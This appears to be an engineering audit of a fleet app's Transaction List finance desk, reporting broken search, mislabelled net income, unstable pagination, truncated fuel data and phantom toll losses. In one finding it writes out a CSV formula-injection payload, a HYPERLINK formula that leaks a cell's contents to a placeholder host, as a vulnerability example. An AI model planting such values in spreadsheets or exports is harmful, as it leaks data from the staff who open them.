# Transaction List — Enterprise Readiness Audit

**Section:** Business Finance → Transaction List (`page id: transaction-list`, permission `nav.transaction_list`)
**App:** RoamFleet (`apps/fleet`)
**Date:** 2026-09-11
**Type:** Audit only. No code was modified.
**Scope discipline:** Findings are limited to the Transaction List desk and the read paths it owns. Where a defect lives in shared infrastructure (the KV→SQL bridge, `/trips/search`), it is included *because this section is the caller that trips it*, and the blast radius is noted.

---

## 1. Executive summary

**Is this enterprise-grade today? No.**

Not "needs polish." The section has defects that make it produce wrong numbers and lose records, and at least one that makes a core control return HTTP 500 every time it is used.

The four headline reasons:

1. **The search box cannot work.** `/trips/search` calls `query.ilike(...)` on a query builder that does not implement `ilike`. Every keystroke in "Search driver name or trip ID…" produces a `TypeError` on the server, caught and returned as a 500. This is the only `.ilike` call site in the fleet server, and the Trip Ledger is the only caller that reaches it. (F-01)
2. **"Net Income" is not net.** The column falls back `netToDriver → grossEarnings → amount`. InDrive trips populate none of the first two, so the ledger prints the **gross fare** in a green column labeled Net Income, while the InDrive service fee sits unused in a hidden column. Your own screenshot confirms it: every Net Income equals Amount, and the KPI reads `Page Revenue $52,095.02 / Net: $52,095.02`. (F-02)
3. **The ledger is not complete or stable under paging.** Rows are ordered by `fleet.trips.date`, a **`date` column** (day granularity), with **no tiebreaker**, under **OFFSET** pagination. Ties at page boundaries mean rows are silently duplicated or skipped as you page. A ledger that cannot guarantee "every record appears exactly once" is not a ledger. (F-04)
4. **Three tabs, three different architectures, four different default time windows.** Trip is server-paged. Fuel and Toll pull everything into the browser — and Fuel silently pulls *only the current fuel week, capped at 500 rows*, while telling the user it shows "All fuel entries." Trip defaults to all-time, Fuel to this week, Toll to all-time, Statement Summary to this month. No two tabs can be reconciled against each other. (F-05, F-11)

Underneath those is a structural problem: **this is a presentation layer with no read model behind it.** Four tabs each reach into a different backend shape (KV-bridged `fleet.trips`, a fuel list endpoint, a toll *reconciliation export* endpoint that runs the matching engine on every page view, and a statement aggregation API), then each re-implement filtering, sorting, pagination, KPIs and CSV export in their own way. There is no canonical "ledger entry," so there is nothing to be correct *about*.

The good news: the app already contains better versions of most of the missing pieces. `components/trips/TripLogsPage.tsx` is a scope-aware, react-query, server-stats trip list. `/trips/stats` is a server aggregate endpoint. `PeriodWeekDropdown` is a shared period picker. The work is largely consolidation, not invention.

**Verdict: rebuild the data path, keep the visual design.** Section 11 proposes a single ledger read model and a migration that does not require a UI rewrite.

---

## 2. Scope and assumptions

### In scope
| Layer | Files |
|---|---|
| Container | `apps/fleet/src/components/transactions/TransactionsPage.tsx`, `components/finance/TabbedTransactionList.tsx` |
| Trip tab | `components/database/TripLedgerPage.tsx` + `trip-ledger/{TripLedgerTable,TripLedgerFilterBar,TripLedgerStats,TripLedgerExport,TripLedgerColumnToggle,PaymentLinesPanel}.tsx` |
| Fuel tab | `components/database/FuelLedgerPage.tsx` + `fuel-ledger/*` |
| Toll tab | `components/database/TollLedgerPage.tsx` + `toll-ledger/*` |
| Statement tab | `components/finance/PlatformStatementSummary.tsx` |
| Client API | `apps/fleet/src/services/api.ts` — `getTripsFiltered`, `getTripStats`, `getAllFuelEntries`, `getTollTransactionsExport`, `getStatementSummary` |
| Server | `_fleet-server/index.tsx` `/trips/search`, `/trips/stats`; `fuel_controller.tsx` `GET /fuel-entries`; `toll_controller.tsx` `GET /toll-reconciliation/export` |
| Data bridge | `_fleet-server/fleet_sql_bridge.ts`, `repos/baseRepo.ts`, `repos/fleet_column_map.ts` |
| Schema | `fleet.trips` (`migrations/20260811200000_fleet_schema_foundation.sql`) |
| Nav / RBAC | `App.tsx:744`, `AppSidebar.tsx:289`, `packages/auth-client/src/permissions.ts`, `_fleet-server/rbac_middleware.ts` |

### Out of scope (touched only where this section shares the code path)
Week Reconciliation, Close Week, Driver Settlements, Fuel Management, Toll Reconciliation wizard, Business Finance Workbench, Super Admin `CustomerLedgerView`, Imports.

### Facts vs. assumptions

**Observed (read from source / visible in your screenshot):** everything cited with a file path or line number, plus: 3,330 total trips, 50 rows loaded, `Page Revenue == Net`, Cancelled rows at `$0.00`, and 11 visible columns where `DEFAULT_VISIBLE_KEYS` defines 13.

**Assumed — flag if wrong:**
- **A1.** `FEATURE_FLAGS.STRICT_ORG_FILTER` is **off** in production (the legacy `orOrg` branch runs). This drives F-25's severity.
- **A2.** `isFleetReadTableEnabled('trips')` is **on**, so `/trips/search` uses the SQL pushdown path rather than raw KV. F-01 fails either way; F-04 and F-10 depend on pushdown.
- **A3.** InDrive trips are the dominant platform by volume and do not carry `netToDriver`. Your screenshot supports this; a DB count would confirm.
- **A4.** Current scale ≈ 3.3k trips / single-digit thousands of fuel + toll rows. Several findings are latent at this size and fatal at 100k+.
- **A5.** Primary users are fleet finance/ops staff during weekly close, not end-of-month only.

### What I could not determine (Section 13 lists these as data requests)
Production p95 latency, actual row counts per domain, whether `FUEL_LIST_DEFAULT_LIMIT=500` is currently being hit, whether `/statement-summary` double-counts across platforms, and your target SLOs — the Context block in your brief was left blank.

---

## 3. Full functional walkthrough — what it does today

### 3.0 Entry
Sidebar → **Business Finance → Transaction List** (`AppSidebar.tsx:289`). Guarded by `PermissionGate permission="nav.transaction_list"`. `TransactionsPage` renders a back-chrome bar plus `TabbedTransactionList`. It is **statically imported** in `App.tsx:17` while its sibling desks are lazy — so the entire ledger bundle ships to every user on first load.

`TabbedTransactionList` is ~86 lines: a title, four tab buttons, and a card. It holds `activeTab` in local state and nothing else. **Switching tabs unmounts the previous tab entirely** — filters, page position, sort, and expanded row are destroyed and the new tab refetches from scratch. There is no URL state, so nothing here is linkable or restorable.

It also carries `const [loading] = useState(false)` — a loading branch that can never fire.

### 3.1 Trip Ledger tab (the default)

**Load.** `TripLedgerPage` holds `trips/total/page/pageSize/loading/error/filters` in `useState`. A `useEffect` on `[page, pageSize, filters]` calls `api.getTripsFiltered({limit, offset, ...filters})` → `POST /trips/search`. A `fetchIdRef` counter discards stale responses — correct, and the only place in the section that handles it.

**Server.** `/trips/search` builds a chained query against `fromKvStore()` with `.like("key","trip:%")`, applies org scoping, driver/status/platform/vehicle/date filters, `.order("value->>date", {ascending:false})` and `.range(offset, offset+limit-1)` with `count:'exact'`. The chain is intercepted by `fleet_sql_bridge.ts`, which translates recognized calls into real SQL against `fleet.trips` via `queryFleet`. `route`/`stops` are stripped from each payload; `GoRide` is rewritten to `Roam`.

**Render.** Five KPI cards (`TripLedgerStats`), then a 55-column-capable table (`TripLedgerTable`) showing whichever columns are in `localStorage['roam_trip_ledger_columns']`. Clicking a row expands an inline detail panel with ~42 fields plus `PaymentLinesPanel`, which fires its own uncached fetch per expand. Clicking the ID cell copies the full UUID.

**Controls.** Search (350ms debounce), Platform chip, Status chip, `PeriodWeekDropdown`, two raw `<input type=date>`, Clear. Column toggle. Refresh. Export.

### 3.2 Fuel Ledger tab
`FuelLedgerPage` calls `api.getAllFuelEntries()` → `GET /fuel-entries` with **no parameters**, receives a bare array, and does **all** filtering, sorting, and pagination in the browser over that array. Stats are computed over the filtered set (correct scope, unlike Trip).

The server, receiving no `startDate`, substitutes `defaultFuelWeekBounds()` — the *current fuel week* — and caps at `FUEL_LIST_DEFAULT_LIMIT = 500`. It sets `X-Total-Count`; the client never reads it. The h1 says "All fuel entries."

### 3.3 Toll Ledger tab
`TollLedgerPage` calls `api.getTollTransactionsExport()` → `GET /toll-reconciliation/export`. Same client-side filter/sort/paginate pattern as Fuel.

That endpoint is not a list endpoint. On every tab open it:
1. loads **every** toll ledger row **and every trip in the org** into the edge function (`loadAllTollLedgerWithTrips` → `loadAllByPrefix("trip:")`, which pages 1,000 at a time with no cap),
2. classifies each transaction Matched/Dismissed/Approved/Unmatched,
3. `kv.mget`s the linked trips,
4. runs `findTollMatchesServer` — fuzzy time/driver/plaza matching — for **every unmatched transaction against every trip**,
5. flattens, sorts, and returns the entire set unpaginated.

### 3.4 Statement Summary tab
The healthiest tab. React-query with `staleTime`, server-side aggregation via `getStatementSummary`, fleet-vs-driver scope toggle, date presets + `PeriodWeekDropdown`, tooltips on every metric, per-platform cards and a Combined Totals strip. Defaults to **This Month**. Knows three platforms (Uber, Roam, InDrive).

### 3.5 Export
Per-tab, client-side. `TripLedgerExport` builds a CSV from the **`trips` array currently in state** — i.e. the current page — using the visible columns. It reports `Exported 50 trips`. There is no path to export the filtered result set.

---

## 4. Architecture findings

### 4.1 There is no read model
The section's name promises one thing — a list of transactions — and four tabs deliver four unrelated things from four unrelated shapes. There is no canonical entry type, no shared filter grammar, no shared period concept, no shared money semantics. Each tab re-implements filtering, sorting, pagination, KPIs and export against its own backend contract. That is why the tabs cannot be reconciled and why every fix has to be made four times.

### 4.2 The data model is a JSONB blob with a denormalized filter mirror

```sql
CREATE TABLE fleet.trips (
  id text PRIMARY KEY, organization_id text, date date,
  driver_id text, vehicle_id text, platform text, status text,
  amount numeric, batch_id text, payment_method text,
  legacy_kv_id text NOT NULL, payload_json jsonb NOT NULL DEFAULT '{}', ...
);
```

Nine typed columns; **everything else the ledger displays lives in `payload_json`** — `netToDriver`, `grossEarnings`, `fareBreakdown.*`, `tollCharges`, `indriveServiceFee`, `cashCollected`, all the Uber SSOT fields. Consequences:

- **You can filter/sort on 9 fields and display 55.** Any column outside the mirror is unsortable and unfilterable server-side, forever.
- **The mirror can drift.** `fleet.trips.amount` is what you filter and sort by; `payload_json->>'amount'` is what `rowToKvValue` returns and the UI prints. Nothing in the read path asserts they agree. A drifted row sorts in one position and displays a different number, and no control would catch it.
- **`date` is `date`, not `timestamptz`,** while the payload carries the full timestamp the UI renders. Day-granularity ordering is the direct cause of F-04.

### 4.3 The KV→SQL bridge silently drops filters it does not understand

`fleet_sql_bridge.ts` is a compatibility shim: it records chained builder calls and replays them as SQL. Its failure mode is the problem — **unrecognized filters are dropped, not rejected**:

```ts
// fleet_sql_bridge.ts:152
console.warn("[fleetSqlBridge] unmapped or() filter (skipped):", expr.slice(0, 200));
```

and in the non-`or` branch, `not` reaches the `if/else if` chain (`eq/neq/gte/gt/lte/lt/in/like/is`), matches nothing, and falls through with no filter pushed and no warning at all.

The supported-method list (`fleet_sql_bridge.ts:307-311`) is `select, like, eq, neq, gte, gt, lte, lt, in, or, order, range, limit, maybeSingle, single, insert, upsert, update, delete, match, filter, not, is, contains, containedBy, textSearch, csv, throwOnError`. **`ilike` is absent** — so calling it does not degrade, it throws (F-01). Meanwhile `not` is *present* as a method but *absent* from the translation, so it degrades silently (F-10).

This is the worst of both worlds: an unknown filter either 500s or returns **more data than asked for** while reporting success. In a financial list, "returned too much and said OK" is the more dangerous half.

### 4.4 Coupling: a read path that runs a write-shaped engine
The Toll tab's read is `GET /toll-reconciliation/export` — the reconciliation wizard's export endpoint. Opening a table therefore executes the match engine over the full trip corpus. Listing and reconciling are different concerns with different cost profiles and different correctness requirements; binding them means the list cannot be made fast without touching reconciliation, and reconciliation cannot be changed without changing what the list shows.

### 4.5 State management: three different paradigms in one desk
- Trip: raw `useState` + `useEffect` + a manual `fetchIdRef` race guard, no cache, no `keepPreviousData`.
- Fuel/Toll: raw `useState` + full client-side dataset.
- Statement: `@tanstack/react-query` with `staleTime` and structural keys.

React-query is already a dependency and already used correctly two tabs over. Every refetch in Trip/Fuel/Toll is a cold fetch; every tab switch is a full reload.

### 4.6 Redundancy: two trip lists that will disagree
`apps/fleet/src/components/trips/TripLogsPage.tsx` renders the same `fleet.trips` data with react-query + `keepPreviousData`, **server-side stats via `/trips/stats`**, and **service-line scope awareness** (`filterTripsByServiceLineScope`). The Trip Ledger has none of those. Two screens, same data, different numbers, no documented authority between them.

### 4.7 Idempotency and failure modes
The section is read-only, so there is no write idempotency concern — but the read path has no partial-failure vocabulary:

| Failure | Current behavior | Should be |
|---|---|---|
| Fuel result truncated at 500 | Renders as complete; stats computed over the truncation | Explicit "showing 500 of N" banner |
| Fuel window defaulted to current week | Renders as "All fuel entries" | Explicit window chip |
| Bridge drops a filter | 200 OK with too many rows | 4xx / typed error |
| Toll `kv.mget` for trips fails | `catch {}` → all matched tolls get `tripTollCharges: 0` → phantom losses (F-06) | Fail the request or mark rows unresolved |
| Trip fetch fails | Red card with `statusText`, no correlation id | Typed error + request id |
| Row's `id` is empty | `key={trip.id \|\| 'row-'+idx}` → React key collisions on re-sort | Reject rows without a primary key |

### 4.8 Multi-tenancy
`orOrg` expands to `organization_id.eq.<org> OR organization_id IS NULL OR organization_id = 'roam-default-org'` (`baseRepo.ts:112-116`). Under assumption A1 that is the live path. Any trip with a null org, or any trip stamped to `roam-default-org`, is visible in **every** tenant's Transaction List. Whether that is a real leak depends entirely on what is sitting in those buckets (Section 13, Q4).

---

## 5. Performance findings

### 5.1 Client rendering
- **No virtualization.** 100 rows × up to 55 columns = 5,500 cells, each a `<td>` with template-literal class strings. `DataRow` is `React.memo`'d, but `loading` is a prop on every row and flips on every fetch — so all rows re-render twice per interaction regardless.
- **Layout thrash.** `whitespace-nowrap` on every cell plus per-column inline `minWidth` on a `min-w-full` table forces a full layout pass on every column toggle.
- **Bundle.** `TripLedgerTable.tsx` is 47KB, Fuel 32KB, Toll 33KB, filter bars ~44KB combined — all statically imported into the main chunk (`App.tsx:17`) for users who may never open the desk.
- **Sticky header never sticks.** `thead` is `sticky top-0` inside a container that only scrolls horizontally (`overflow-x-auto`, no height constraint). Scroll 100 rows and you lose your column labels.

### 5.2 Network
- Every filter change = one round trip with `count:'exact'`; no `keepPreviousData`, so the table empties and re-skeletons on each keystroke-debounce boundary.
- Fuel and Toll transfer their **entire dataset** on every mount. The toll payload carries ~28 fields per row including match suggestions.
- `PaymentLinesPanel` = one uncached request per row expand, repeated on every collapse/re-expand.
- Trip/Fuel/Toll use a 1-retry `fetchWithRetry` with no `AbortController` on unmount — an in-flight request outlives the tab switch that cancelled the user's interest in it.

### 5.3 API
- `/toll-reconciliation/export` is O(unmatched × trips) CPU plus O(all toll + all trips) memory on an edge function, on a **read**. `fleet_sql_bridge.ts`'s own header cites `WORKER_RESOURCE_LIMIT` as the root cause this bridge was built to fix — this endpoint reintroduces exactly that shape.
- `/trips/stats` exists, works, is used by `TripLogsPage`, and is **not called by this section**. The KPI row recomputes a weaker version client-side from 50 rows.
- No `Cache-Control`, no ETag, no cursor support anywhere.

### 5.4 DB / queries
- `LIKE 'legacy_kv_id' LIKE 'trip:%'` on every request. Indexes present: `(organization_id, date)`, `(driver_id, date)`, `(batch_id)`, `(status)`, `UNIQUE(legacy_kv_id)`.
- **`ORDER BY date DESC` with no tiebreaker.** Not just a stability problem (F-04) — with `OFFSET n` the planner must produce and discard `n` rows.
- **`count:'exact'` on every page.** Exact counts require a full scan of the filtered set. At 3.3k rows it is invisible; at 500k it dominates the request.
- **Payload filters are unindexed expressions.** `resolveFleetColumn` maps any unmapped `value->>X` to `payload_json->>X`. A driver-name filter (if F-01 were fixed as written) becomes an unindexed JSONB expression scan.
- `SELECT *` then `rowToKvValue` — the full `payload_json` crosses the wire for every row even when 11 columns are visible.

### 5.5 Background jobs
None owned by this section. Noted as a gap: there is no materialization, no pre-aggregation, no warm cache for a desk whose whole job is reading.

### 5.6 Infra
Supabase Edge (Deno) + PostgREST. The binding constraints are edge worker memory/CPU (§5.3) and PostgREST's 1,000-row ceiling, which `/trips/search` already clamps to. Nothing here is sized for a ledger.

---

## 6. UX findings

### 6.1 Flow
- **Tab switch = total state loss.** Filter to a week on Trip, check Fuel, come back — you start over.
- **No URL state.** You cannot send a colleague "the three rows that look wrong." For a finance desk where the primary workflow is *someone disputes a number*, this is the single most-felt gap.
- **No saved views.** Every investigation rebuilds the same filter set by hand.
- **Two date systems in one filter bar.** `PeriodWeekDropdown` (the org's real week concept) sits beside two raw `<input type=date>` that can be set to contradict it, with no indication which won.
- **Sort lies.** Clicking Amount sorts 50 of 3,330 rows with no visual distinction from a real sort (F-03).
- **Export lies by omission.** The button reads `Export (50)` against a header that reads `3,330`. Nothing states that the export is page-scoped.
- **ID is the primary key and is both truncated (`…12005bcc`) and unsearchable** (F-01).
- **No bulk selection, no row actions, no drill-through** from a trip row to its driver, vehicle, settlement, or batch.

### 6.2 Error, empty, loading states
- Error card prints `Failed to search trips: Internal Server Error` — the raw `statusText`. No correlation id, no next step. This is what a user sees today every time they type in the search box.
- Empty state says *"There are no trip records to display. Import trip data to get started."* even when the user has simply filtered to a quiet Tuesday. Wrong diagnosis, wrong call to action.
- Loading dims every row to `opacity-50` and shows skeletons only when `trips.length === 0`, so a refetch looks like a rendering glitch.
- Fuel/Toll have **no truncation state at all** — the concept does not exist in the UI.
- Statement's "No statement data" cannot distinguish "no earnings" from "driver has no linked platform IDs."

### 6.3 Accessibility (against WCAG 2.1 AA)
- **Heading order inverted:** `h2` "Transaction List" contains `h1` "Trip Ledger" / "Fuel Management Ledger".
- **Sortable `<th>` are not interactive elements.** `onClick` on a `<th>` with no `role="button"`, no `tabIndex`, no key handler, and **no `aria-sort`**. Sorting is keyboard- and screen-reader-inaccessible.
- **Rows are clickable `<tr>`** with `cursor-pointer` and no `role`, `tabIndex`, or Enter/Space handling. The expand interaction does not exist for keyboard users.
- `<th>` lack `scope="col"`; the table has no `<caption>`.
- `ChipDropdown` is a `<button>` + `<div>` with no `aria-haspopup`, `aria-expanded`, `role="listbox"`, or roving focus. The clear "×" is an SVG with a click handler inside the button — not focusable, no accessible name.
- Status/platform meaning is carried by **color plus text** — acceptable — but `Lines Match` uses bare colored "Yes"/"No" with no icon.
- No live region announces "3,330 results" after a filter change.
- Tab bar is a `div` of `<button>`s with no `role="tablist"` / `aria-selected` / arrow-key navigation.

### 6.4 Information design
- The KPI row **mixes scopes without saying so**: "Total Trips 3,330" is the filtered total; the other four cards describe the 50 rows on screen. The sub-labels ("50 loaded on page", "per trip on page") are 10px grey text under 18px bold numbers. Nobody reads the disclaimer.
- **The one number a finance ledger must show does not exist:** the total Amount and total Net for the current filter. You can see revenue for 50 rows or a trip count for 3,330, never money for 3,330.
- Cancelled trips (`$0.00`) are included in "Avg Trip Amount," dragging it toward zero with no exclusion or footnote.
- "Net Income" is rendered in emerald bold — the strongest visual weight in the row — and it is the least trustworthy number on screen (F-02).

---

## 7. Correctness findings — the critical workflow

The critical workflow here is: **"a number somewhere else is disputed; open the ledger, find the underlying transactions, and prove or disprove the number."** Everything below is a way that workflow silently produces a wrong answer.

### 7.1 The search box returns 500 — always

```ts
// _fleet-server/index.tsx:1933-1935  — reached when driverName is set and driverId/driverIds are not
} else if (driverName) {
    query = query.ilike("value->>driverName", driverName);
}
```
```ts
// fleet_sql_bridge.ts:307-311 — the builder's entire method surface
const methods = ["select","like","eq","neq","gte","gt","lte","lt","in","or","order","range",
  "limit","maybeSingle","single","insert","upsert","update","delete","match","filter","not",
  "is","contains","containedBy","textSearch","csv","throwOnError"];   // no "ilike"
```

`api.ilike` is `undefined` → `TypeError` at call time, before the promise is ever created → the route's `catch` → `500 {"error": "query.ilike is not a function"}` → client error card.

`TripLedgerPage` maps `search → driverName` and sends neither `driverId` nor `driverIds`, so it lands on this branch every time. This is the **only** `.ilike` call in the fleet server, which is why nothing else has surfaced it.

Two further defects hide behind it: the comment in `TripLedgerPage.tsx:33` claims *"server does fuzzy match on driver name + trip ID"* — **there is no trip-ID matching anywhere in the handler**, and `.ilike(col, value)` with **no `%` wildcards** is an exact case-insensitive match, not a fuzzy one. Fixing the crash without fixing these gives you a search box that only matches a driver's full name, exactly, and never matches a trip ID — the thing the placeholder tells users to type.

### 7.2 "Net Income" prints gross

```ts
// identical in TripLedgerTable.tsx:80, TripLedgerStats.tsx:7, TripLedgerExport.tsx:9
function getNetIncome(t: Trip): number | null {
  if (t.netToDriver != null) return t.netToDriver;
  if (t.grossEarnings != null) return t.grossEarnings;   // ← gross, labelled net
  if (t.amount != null) return t.amount;                 // ← fare, labelled net
  return null;
}
```

`netToDriver` is written by exactly three producers: CSV import (`csvHelpers.ts:1882`), Rush orders (`orderToFleetTrip.ts:54`, where it is set equal to `amount`), and Roam rides (`rideToFleetTrip.ts:79`). **No InDrive path populates it.** InDrive trips therefore fall through twice and display `amount`.

The section already carries the correct value in adjacent columns — `indriveNetIncome`, `indriveServiceFee`, `indriveServiceFeePercent` — all `defaultVisible: false`. The ledger has the right number and shows the wrong one.

This propagates to the KPI strip (`Net: $52,095.02` in your screenshot — identical to gross revenue, which is the tell) and to CSV export, from which downstream spreadsheets are built.

### 7.3 Sorting is page-local

```ts
// TripLedgerTable.tsx:915-920
const sortedTrips = useMemo(() => {
  if (!sortKey || !sortDir) return trips;              // `trips` = the 50 rows in state
  return [...trips].sort((a, b) => compareValues(...));
}, [trips, sortKey, sortDir]);
```

Sort state never reaches `/trips/search`. "Show me the largest transactions" — the most common ledger query there is — returns the largest of an arbitrary 50. The UI gives no hint: same chevron, same affordance, same feel as a real sort. Fuel and Toll sort the *full loaded set*, which is correct for them but means **the three tabs behave differently under the same gesture**.

### 7.4 Pagination can duplicate and skip rows

`ORDER BY date DESC` where `date` is a **`date`** column, under `OFFSET`/`LIMIT`. Postgres makes no guarantee about the relative order of tied rows between two separate queries. With ~7 trips on Sep 6 in your screenshot and 50-row pages, ties straddle page boundaries constantly. Page 1 and page 2 are independent queries; a row tied at the boundary can appear in both, or in neither.

There is no unique tiebreaker in the sort, no keyset cursor, and no client-side dedupe. **This means the Transaction List cannot assert that it shows every transaction exactly once** — which is the defining property of a ledger. It is also silent: no error, no warning, and the total count stays reassuringly constant.

### 7.5 The Fuel tab shows one week and claims to show everything

```ts
// api.ts:4350 — no date params, no limit
async getAllFuelEntries(organizationId?: string) {
  const url = `${API_ENDPOINTS.fuel}/fuel-entries`;  ...
}
```
```ts
// fuel_controller.tsx:2800-2812
const limit = Math.min(..., FUEL_LIST_MAX_LIMIT);          // default 500, max 1500
if (!/^\d{4}-\d{2}-\d{2}$/.test(startDate)) {
  const week = await defaultFuelWeekBounds();               // ← current fuel week
  startDate = week.startDate;
  if (!/^\d{4}-\d{2}-\d{2}$/.test(endDate)) endDate = week.endDate;
}
...
c.header("X-Total-Count", String(res.count ?? narrowed.length));   // client never reads this
```

Header: *"Fuel Management Ledger — All fuel entries."* Reality: **the current fuel week, capped at 500 rows.** The tab's date-range filter then filters *within* that week, so selecting last month returns zero rows and the UI reports "no entries found" rather than "outside the loaded window." Every KPI on the tab is computed over the truncated set and presented as a total.

### 7.6 Phantom toll losses

```ts
// toll_controller.tsx:10021-10025
const tripTollCharges = linkedTrip?.tollCharges || 0;
const variance = tripTollCharges - absAmount;
row.refundAmount = variance >= 0 ? variance : 0;
row.lossAmount   = variance < 0 ? Math.abs(variance) : 0;
```

If the linked trip has no `tollCharges`, or if `linkedTrip` is missing because the `kv.mget` at line 9937 threw (it is wrapped in a bare `catch {}` that logs and continues), then `tripTollCharges = 0` and **the entire toll is booked as a loss**. A successfully matched, correctly reconciled toll appears in the ledger as unrecovered money. Missing data and a real loss are indistinguishable in the output.

### 7.7 Export is page-scoped and the CSV is unsafe

```ts
// TripLedgerExport.tsx:129-140
const handleExport = () => {
  if (trips.length === 0) { toast.error('No trips to export'); return; }
  const csv = buildCsv(trips, activeCols);              // `trips` = current page only
  toast.success(`Exported ${trips.length} trips (...)`);
};
```

`total` is passed in as a prop and **never used**. Exporting 50 of 3,330 rows is reported as unqualified success.

And `csvEscape` only handles `, " \n \r`:

```ts
function csvEscape(val: string): string {
  if (val.includes(',') || val.includes('"') || val.includes('\n') || val.includes('\r')) {
    return `"${val.replace(/"/g, '""')}"`;
  }
  return val;
}
```

No neutralization of a leading `=`, `+`, `-`, `@`, tab or CR. Fields sourced from imported CSVs and free text — `driverName`, `notes`, `pickupLocation`, `dropoffLocation`, and on the toll side `plaza`/`description` — flow straight into the export. A driver name of `=HYPERLINK("http://x/"&A1,"click")` executes on open in Excel. This is a **formula-injection vector in a file finance staff open by habit**. The same pattern appears in `FuelLedgerExport` and `TollLedgerExport`.

### 7.8 Service-line scope is a no-op on this path
The global **SCOPE: Rideshare** switcher is visible in the header of your screenshot. `TripLedgerPage` never reads `useServiceLineScope()` and never sends `serviceLine`. Even if it did, the bridge drops both branches:
- `serviceLine: 'rideshare'` → `.not('value->>platform','eq','Roam Rush')` → `not` has no translation → **dropped silently**.
- `serviceLine: 'rush_delivery'` → a 3-clause `.or()` with only one `platform.eq` match → fails the `platformEqs.length >= 2` test at `fleet_sql_bridge.ts:147` → **logged as unmapped, skipped**.

`TripLogsPage` masks this with a client-side `filterTripsByServiceLineScope`, so its *rows* look right while its *total* is wrong. The Transaction List has no such mask: Rush deliveries appear in the Rideshare-scoped ledger.

Secondary: even a working `.not(platform = 'Roam Rush')` excludes rows where `platform IS NULL`, because `NOT (NULL = 'x')` is `NULL`.

### 7.9 Stale column preferences hide default columns
`localStorage['roam_trip_ledger_columns']` is read with no version key and no reconciliation against `ALL_COLUMNS`:

```ts
if (Array.isArray(parsed) && parsed.length > 0) return parsed;   // TripLedgerPage.tsx:18
```

`DEFAULT_VISIBLE_KEYS` currently resolves to 13 columns including `cashCollected` and `paymentLineRollupMatch`. Your screenshot shows 11, ending at "Payment". **Both integrity columns are missing** because they were added after your preference was saved. Every existing user is permanently missing every column added since their first visit — including `Lines Match`, which exists specifically to flag payment-rollup mismatches.

### 7.10 Filter-bar stale closure drops a filter change
```ts
// TripLedgerFilterBar.tsx:150-156
const handleSearchChange = (val: string) => {
  setLocalSearch(val);
  debounceRef.current = setTimeout(() => {
    onChange({ ...filters, search: val });   // `filters` captured at keystroke time
  }, 350);
};
```
Type a character, then change Platform within 350ms: the timer fires with the **pre-change** `filters` and reverts the platform selection. The chip and the result set disagree until the next interaction.

---

## 8. Findings table

Severity: **S1** = wrong numbers, data loss, or hard failure · **S2** = materially misleading or blocks the workflow · **S3** = friction, scale risk, or quality debt · **S4** = polish.
Effort: **S** < 1d · **M** 1–3d · **L** 1–2wk · **XL** > 2wk.

| ID | Sev | Category | Evidence | Impact | Recommendation | Effort |
|---|---|---|---|---|---|---|
| F-01 | S1 | Correctness / Availability | `index.tsx:1934` `.ilike`; `fleet_sql_bridge.ts:307-311` method list has no `ilike` | Search box returns 500 on every use. Primary lookup control is dead. | Add `ilike` to the builder + an `ilike` case in the filter translation; switch the handler to a wildcarded `%term%`; add trip-ID matching (`legacy_kv_id`/`id`); add a regression test that asserts a 200 for a name query. | S |
| F-02 | S1 | Correctness / Finance | `getNetIncome` in `TripLedgerTable.tsx:80`, `TripLedgerStats.tsx:7`, `TripLedgerExport.tsx:9`; no InDrive writer of `netToDriver`; screenshot `Net == Amount` | Gross fare displayed and exported as "Net Income"; KPI "Net" equals revenue. Directly wrong money. | Remove the fallback chain. Render `—` when net is genuinely unknown. Compute InDrive net from `indriveNetIncome`/`indriveServiceFee` in one shared, tested resolver used by table, stats and export. | M |
| F-03 | S1 | Correctness / UX | `TripLedgerTable.tsx:915-920`; sort state never sent to the server | "Largest transactions" returns the largest of 50 of 3,330. Indistinguishable from a real sort. | Push sort to the server (`sortKey`/`sortDir` → whitelisted columns). Until then, disable sort headers on the Trip tab or badge them "sorts this page only." | M |
| F-04 | S1 | Correctness / Data integrity | `index.tsx:1984` order by `value->>date`; `fleet.trips.date` is `date`; OFFSET paging | Rows silently duplicated or skipped between pages. Ledger completeness is unprovable. | Add a unique tiebreaker (`ORDER BY date DESC, id DESC`) immediately; move to keyset pagination. Consider promoting `date` to `timestamptz` or adding an `occurred_at` column. | M (S for the tiebreaker) |
| F-05 | S1 | Correctness / Scope | `api.ts:4350` sends no dates; `fuel_controller.tsx:2800-2812` defaults to current fuel week, caps at 500 | "All fuel entries" shows one week, ≤500 rows. All Fuel KPIs computed on a truncated set. | Send explicit `startDate`/`endDate`/`limit`/`offset`; read `X-Total-Count`; render an explicit window + truncation banner. Server-side paging (F-19). | M |
| F-06 | S1 | Correctness / Finance | `toll_controller.tsx:10021-10025`; bare `catch {}` at :9943 | Matched tolls booked as full losses when the trip carries no `tollCharges` or the lookup fails. | Distinguish "no trip toll data" from "zero toll." Emit `null` + a `resolution: unknown` state; never default to `0` in a variance. Fail loudly if the trip lookup fails. | M |
| F-07 | S1 | Security / Data | `csvEscape` in all three `*LedgerExport.tsx` | CSV formula injection via driver names, notes, locations, plaza, description. | Prefix any value starting `= + - @ \t \r` with `'`. Quote every field. Add a golden-file test with a hostile name. | S |
| F-08 | S2 | Correctness / Export | `TripLedgerExport.tsx:129-140`; `total` prop unused | "Export" silently emits 1.5% of the filtered set and reports success. | Server-side streamed export of the full filtered set, with a row count in the filename and an explicit confirm above N rows. Interim: relabel "Export this page (50)". | M |
| F-09 | S2 | Correctness / Scope | `TripLedgerPage` never calls `useServiceLineScope` | Global SCOPE selector does not affect the ledger; Rush rows appear under Rideshare. | Wire scope into the query (after F-10). | S |
| F-10 | S1 | Architecture / Silent failure | `fleet_sql_bridge.ts:152` skip-with-warn; `not` unmapped in the `if/else` chain | Unrecognized filters are dropped → **more rows returned than requested, reported as success**. Blast radius: every `fromKvStore` caller. | Make unmapped filters **throw**, never skip. Add `not`/`ilike` translation. Add a Deno test asserting no "unmapped" warning across all production filter shapes. | M |
| F-11 | S2 | Consistency | Trip: none · Fuel: current fuel week · Toll: none · Statement: this month | Four tabs, four time windows. Cross-tab reconciliation is impossible. | One period selector owned by the container, applied to all tabs, defaulting to the org's current period. | M |
| F-12 | S2 | Correctness / UX | `TripLedgerStats.tsx:63-133` | KPI row mixes filtered-total and page-scoped metrics under identical styling. | Call `/trips/stats` (exists, used by `TripLogsPage`). Every KPI describes the filter, not the page. Add **total Amount** and **total Net** for the filter. | M |
